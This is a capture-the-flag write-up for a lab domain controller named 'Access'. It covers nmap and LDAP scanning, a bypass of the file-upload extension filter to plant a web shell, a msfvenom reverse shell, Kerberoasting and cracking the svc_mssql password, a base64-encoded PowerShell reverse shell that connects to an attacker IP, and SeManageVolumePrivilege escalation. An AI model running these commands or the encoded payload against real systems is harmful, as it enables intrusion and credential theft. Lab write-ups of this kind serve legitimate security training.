# Access

## Enumeration & scanning

- System is a domain controller.
- Hosts a webapp that has file upload functionality.


``` sh
# Default scanning
sudo nmap -p- 192.168.190.187
sudo nmap -p 53,80,88,135,139,389,443,445,464,593,636,3268,3269,5985,9389,47001 -A 192.168.190.187
nmap -n -sV --script "ldap* and not brute" 192.168.190.187
feroxbuster -u http://192.168.190.187
```

## Exploitation

- Uploaded files are being filtered. When trying different file [extensions](https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/file-upload/alt-extensions-php.txt), we find an exception.
    - Upload file as `webshell.php......`, this is accepted and saved as `webshell.php`.
- We can easily upload a reverse shell as well using the same form.
- We get access to access to user `access\svc_apache`, but no flag to be found.


``` sh
# Upload reverse shell
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.45.152 LPORT=4444 -f exe -o shell.exe
# Use form to upload shell.exe
# Execute
nc -nlvp 4444
http://192.168.190.187/Uploads/simple-backdoor.php?cmd=shell.exe
```


## Privilege Escalation

- There is also a user `access\svc_mssql` we might need access to.
- This user is Kerberoastable (could find via Bloodhound, but found with separate [check](https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/kerberoast.html) instead). Crack the password (`svc_mssql:trustno1`).
- Needed to revert box to use this password successfully. Different paths should work.
- On this user `SeManageVolumePrivilege` privilege is enabled. Can exploit using script.

``` sh
# Check Kerberoastable users
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation
# Crack
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt 

# Password usage paths
# RunasCs
. .\Invoke-RunasCs.ps1
Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command cmd.exe -Remote 192.168.45.229:4445
# Try services
smbclient -L //192.168.149.187 -U "svc_mssql%trustno1"
ldapdomaindump 192.168.149.187 -u 'access.offsec\svc_mssql' -p 'trustno1'
# Run as other process in PS
$password = ConvertTo-SecureString "trustno1" -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential ("ACCESS\svc_mssql", $password)
Get-ADUser -Identity svc_mssql -Credential $credential
nc -nlvp 4445
Start-Process powershell -Credential $credential -ArgumentList "-nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMgA5ACIALAA0ADQANAA1ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==" -NoNewWindow

# Get flag
C:\Users\svc_mssql\Desktop>type local.txt
type local.txt
4852a9876cf9b4af38dd33f8f22caf23

# Abuse privilege
whoami /priv
# SeManageVolumePrivilege```
./SeManageVolumeExploit.exe 
icacls C:/Windows
# Now have access to complete filesystem as current user
```

## References

- https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/file-upload/alt-extensions-php.txt
- https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/kerberoast.html
- https://github.com/antonioCoco/RunasCs
- https://github.com/CsEnox/SeManageVolumeExploit

## Rabbit holes

- Needed to revert box to make password work for some reason.
